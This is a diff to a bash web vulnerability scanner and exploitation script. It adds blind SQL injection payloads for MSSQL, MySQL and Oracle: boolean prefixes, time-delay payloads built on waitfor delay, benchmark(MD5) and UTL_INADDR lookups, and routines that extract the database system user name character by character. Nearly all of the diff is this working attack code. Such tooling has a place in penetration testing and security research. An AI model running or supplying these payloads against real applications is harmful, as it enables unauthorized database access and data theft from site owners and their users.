@@ -1067,13 +1067,48 @@ if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 fi
 #end of dbms enumeraton if statement
 
+#i had a problem when doing fully blind delay based exploitation: i know the dbms (from the delay payload), but i dont know the numerator [effectively whether injection requires a quote or not]. so, the code below checks to see if we have a value for numerator, if not, we set it to 1. we also set the guessednumeratorflag=1 which causes a second run with a numerator of 1'
+guessednumeratorflag=0
+if [[ "$numerator" == "" ]] ; then
+	echo "Trying integer-based injection - no single quote"
+	if [[ $dbms == "mssql" ]] ; then
+		numerator="1 or 789=789"
+	elif [[ $dbms == "mysql" ]] ; then
+		numerator="789=789"
+	elif [[ $dbms == "oracle" ]] ; then
+		numerator="1 or 789=789"
+	fi
+	guessednumeratorflag=1
+fi
+
+if [ true = "$Z" ] ; then echo "DEBUG! dbms: $dbms numerator: $numerator" ; fi 
+if [ true = "$Z" ] ; then echo "Calling lettergrab" ; fi 
+
 #this line below calls the lettergrab data extraction routine that first tries status/length diffing and then tries delay diffing to perform data extraction:
 lettergrab
 
+#this code re-runs lettergrab with a string based numerator if we guessed the numerator:
+if [[ "$guessednumeratorflag" == "1" ]] ; then
+	echo "Trying string-based injection - using a single quote"
+	if [[ $dbms == "mssql" ]] ; then
+		numerator="a' or 789=789"
+	elif [[ $dbms == "mysql" ]] ; then
+		numerator="1' or 789"
+	elif [[ $dbms == "oracle" ]] ; then
+		numerator="1' or 789=789"
+	fi
+	lettergrab
+fi
 
 if [[ "$dbms" == "" ]] ; then
 	#if we get here then nothing worked - lets have a shot at XPath data extraction instead:
-	echo "Could not determine DBMS or extract data :-( Testing for XPath injection."	
+	echo "Could not determine DBMS using SQL injection"	
+fi
+
+if [[ "$extract" == "0" ]] ; then
+	#if we get here then nothing worked - lets have a shot at XPath data extraction instead:
+	echo "Could not extract data using SQL injection"
+	echo "Testing for XPath injection"	
 fi
 
 ############# begining of XPath injection data extraction section ################
@@ -2107,6 +2142,8 @@ cat ./listofxpathelements.txt 2>/dev/null
 lettergrab()
 {
 echo "Trying status/length-based data extraction"
+
+if [ true = "$Z" ] ; then echo "DEBUG! dbms: $dbms numerator: $numerator" ; fi 
 # adding code to check if we've already got the sysuserlen (length of the system user name) and nambuf (the system user name) values.
 # if we do, lets try em out again on this parameter
 # if this fails, continue to re-run the full lettergrab() as normal...
@@ -2326,7 +2363,7 @@ fi
 #	#status/length diffing didnt work - lets try time based diffing:
 #	lettergrabtimebased
 #fi
-#lettergrabtimebased
+lettergrabtimebased
 
 }
 
@@ -2336,7 +2373,7 @@ echo "Trying time-based data extraction"
 #this is the same as lettergrab, but its *time*, not length/status based
 #currently have to hard-code the detection delay to 8 seconds as using a dynamic variable led to a weird bug...  
 # currently only works for MSSQL
-
+if [ true = "$Z" ] ; then echo "DEBUG! dbms: $dbms numerator: $numerator" ; fi 
 
 # adding code to check if we've already got the sysuserlen (length of the system user name) and nambuf (the system user name) values.
 # if we do, lets try em out again on this parameter
@@ -2371,9 +2408,9 @@ if [[ "$nambuf" != "" ]] ; then
 	if [[ $dbms == "mssql" ]] ; then                                       
 		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if system_user = '$nambuf' waitfor delay '0:0:8'$end"`
 	elif [[ $dbms == "mysql" ]] ; then
-		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (system_user() = '$nambuf') then 789 else 0 end)$end"`
-	elif [[ $dbms == "oracle" ]] ; then
-		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when (select user from dual) = '$nambuf' then 789 else 0 end$end"`
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (system_user() = '$nambuf') then benchmark(10000000,MD5(1)) else 0 end)$end"`
+	elif [[ $dbms == "oracle" ]] ; then 
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/case when (select user from dual) = '$nambuf' then (select (cast (UTL_INADDR.get_host_address('n0where329.z0m') as varchar(20))) from dual) else 'a' end$end"`
 	else
 		echo "Unable to determine DBMS"
 	fi
@@ -2408,7 +2445,7 @@ while [[ $oflag -lt $horiz ]] ; do
 		if [[ $dbms == "mssql" ]] ; then                            
 			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (len(system_user) = $oflag) waitfor delay '0:0:0'$end"`
 		elif [[ $dbms == "mysql" ]] ; then
-			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length(system_user()) = 999) then 789 else 0 end)$end"`
+			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length(system_user()) = 999) then benchmark(10000000,MD5(1)) else 0 end)$end"`
 		elif [[ $dbms == "oracle" ]] ; then
 			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when length((select user from dual)) = 999 then 789 else 0 end$end"`
 		else
@@ -2428,9 +2465,9 @@ while [[ $oflag -lt $horiz ]] ; do
 	if [[ $dbms == "mssql" ]] ; then                                       
 		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (len(system_user) = $oflag) waitfor delay '0:0:8'$end"`
 	elif [[ $dbms == "mysql" ]] ; then
-		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length(system_user()) = $oflag) then 789 else 0 end)$end"`
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length(system_user()) = $oflag) then benchmark(10000000,MD5(1)) else 0 end)$end"`
 	elif [[ $dbms == "oracle" ]] ; then
-		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when length((select user from dual)) = $oflag then 789 else 0 end$end"`
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/case when length((select user from dual)) = $oflag then (select (cast (UTL_INADDR.get_host_address('n0where329.z0m') as varchar(20))) from dual) else 'a' end$end"`
 	else
 		echo "Unable to determine DBMS"
 		oflag=40
@@ -2474,7 +2511,7 @@ if [[ $gotlength == 1 ]] ; then
 			elif [[ $dbms == "mysql" ]] ; then
 				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring(system_user(),$oflag,1)) = 999) then 678 else 0 end)$end"`
 			elif [[ $dbms == "oracle" ]] ; then
-				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when ascii(substr((select user from dual),$oflag,1)) = 999 then 678 else 0 end$end"`
+				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/case when ascii(substr((select user from dual),$oflag,1)) = 999 then 678 else 0 end$end"`
 			else
 				echo "Unable to determine DBMS"
 				oflag=40
@@ -2490,9 +2527,9 @@ if [[ $gotlength == 1 ]] ; then
 		if [[ $dbms == "mssql" ]] ; then                                       
 			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (ascii(substring(system_user,$oflag,1))=$asciinumber) waitfor delay '0:0:8'$end"`
 		elif [[ $dbms == "mysql" ]] ; then
-			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring(system_user(),$oflag,1)) = $asciinumber) then 789 else 0 end)$end"`
+			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring(system_user(),$oflag,1)) = $asciinumber) then benchmark(10000000,MD5(1)) else 0 end)$end"`
 		elif [[ $dbms == "oracle" ]] ; then
-			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when ascii(substr((select user from dual),$oflag,1)) = $asciinumber then 789 else 0 end$end"`
+			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/case when ascii(substr((select user from dual),$oflag,1)) = $asciinumber then (select (cast (UTL_INADDR.get_host_address('n0where329.z0m') as varchar(20))) from dual) else 'a' end$end"`
 		else
 			echo "Unable to determine DBMS"
 			oflag=40
@@ -2523,6 +2560,7 @@ if [[ $gotlength == 1 ]] ; then
 	if [[ $nambuf != "" ]] ; then 
 		remessage="SYS USER IS: $nambuf"
 		echoreporter
+		extract=1
 	fi
 fi
 
@@ -4127,30 +4165,49 @@ cat cleanscannerinputlist.txt | while read i; do
 							#set the vulnerable flag and sploit that mutha
 							vulnerable=1
 							timedelay=1
+							#this code searches the clean payload to ID the dbms 
+							if [[ "$cleanoutput" =~ "waitfor" || "$cleanoutput" =~ "werui" ]] ; then
+								#echo "[TIME-DELAY-WAITFOR DBMS IS MSSQL] " >> ./output/$safelogname$safefilename.txt
+								#echo -e '\E[31;48m'"\033[1m[TIME-DELAY-WAITFOR DBMS IS MSSQL]\033[0m"
+								#tput sgr0 # Reset attributes.	
+								dbms=mssql
+							fi
+							if [[ "$cleanoutput" =~ "benchmark" && "$cleanoutput" =~ "MD5" ]] ; then
+								#echo "[TIME-DELAY-BENCHMARK DBMS IS MYSQL] " >> ./output/$safelogname$safefilename.txt
+								#echo -e '\E[31;48m'"\033[1m[TIME-DELAY-BENCHMARK DBMS IS MYSQL]\033[0m"
+								#tput sgr0 # Reset attributes.	
+								dbms=mysql
+							fi
+							if [[ "$cleanoutput" =~ "UTL_INADDR" ]] ; then
+								#echo "[TIME-DELAY-UTL_INADDR DBMS IS ORACLE] " >> ./output/$safelogname$safefilename.txt
+								#echo -e '\E[31;48m'"\033[1m[TIME-DELAY-UTL_INADDR DBMS IS ORACLE]\033[0m"
+								#tput sgr0 # Reset attributes.	
+								dbms=oracle
+							fi
 								if [[ $method != "POST" ]] ; then #we're doing a get - simples
-									echo "[TIME-DELAY-"$time_diff"SEC REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safelogname$safefilename.txt 
-									echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC REQ:$K]\033[0m $method URL: $uhostname$page"?"$output"
+									echo "[TIME-DELAY-"$time_diff"SEC $dbms REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safelogname$safefilename.txt 
+									echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC $dbms REQ:$K]\033[0m $method URL: $uhostname$page"?"$output"
 									tput sgr0 # Reset attributes.
 								else
 									if (($firstPOSTURIURL>0)) ; then
 										if [ $firstPOSTURIURL == 1 ] ; then
-											echo "[TIME-DELAY-"$time_diff"SEC REQ:$K] $method URL: $uhostname$page"?"$static"??"$output" >> ./output/$safelogname$safefilename.txt
-											echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC REQ:$K]\033[0m $method URL: $uhostname$page"?"$static"??"$output"
+											echo "[TIME-DELAY-"$time_diff"SEC $dbms REQ:$K] $method URL: $uhostname$page"?"$static"??"$output" >> ./output/$safelogname$safefilename.txt
+											echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC $dbms REQ:$K]\033[0m $method URL: $uhostname$page"?"$static"??"$output"
 											tput sgr0 # Reset attributes.
 										else
-											echo "[TIME-DELAY-"$time_diff"SEC REQ:$K] $method URL: $uhostname$page"??"$output" >> ./output/$safelogname$safefilename.txt
-											echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC REQ:$K]\033[0m $method URL: $uhostname$page"??"$output"
+											echo "[TIME-DELAY-"$time_diff"SEC $dbms REQ:$K] $method URL: $uhostname$page"??"$output" >> ./output/$safelogname$safefilename.txt
+											echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC $dbms REQ:$K]\033[0m $method URL: $uhostname$page"??"$output"
 											tput sgr0 # Reset attributes.
 										fi
 									elif [ "$multipartPOSTURL" == 1 ] ; then
 										#normal post
-										echo "[TIME-DELAY-"$time_diff"SEC REQ:$K] $method URL: $uhostname$page"???"$output" >> ./output/$safelogname$safefilename.txt
-										echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC REQ:$K]\033[0m $method URL: $uhostname$page"???"$output"
+										echo "[TIME-DELAY-"$time_diff"SEC $dbms REQ:$K] $method URL: $uhostname$page"???"$output" >> ./output/$safelogname$safefilename.txt
+										echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC $dbms REQ:$K]\033[0m $method URL: $uhostname$page"???"$output"
 										tput sgr0 # Reset attributes.
 									else
 										#normal post
-										echo "[TIME-DELAY-"$time_diff"SEC REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safelogname$safefilename.txt
-										echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC REQ:$K]\033[0m $method URL: $uhostname$page"?"$output"
+										echo "[TIME-DELAY-"$time_diff"SEC $dbms REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safelogname$safefilename.txt
+										echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC $dbms REQ:$K]\033[0m $method URL: $uhostname$page"?"$output"
 										tput sgr0 # Reset attributes.
 									fi
 								fi
@@ -4222,7 +4279,7 @@ else # just aggregate this report file only
 fi
 
 cat '' > ./alertmessage.txt 2>/dev/null
-if [[ "$includereports" == "1" ]]; then # aggregate all prior reports:
+if [[ "$includereports" == "1" ]] ; then # aggregate all prior reports:
 	alertmessage=`cat ./output/$safelogname$safehostname* 2>/dev/null | cut -d " " -f1,2 | cut -d "[" -f2 | sort -r | uniq`
 else # just aggregate this report file only
 	alertmessage=`cat ./output/$safelogname$safefilename* 2>/dev/null | cut -d " " -f1,2 | cut -d "[" -f2 | sort -r | uniq`
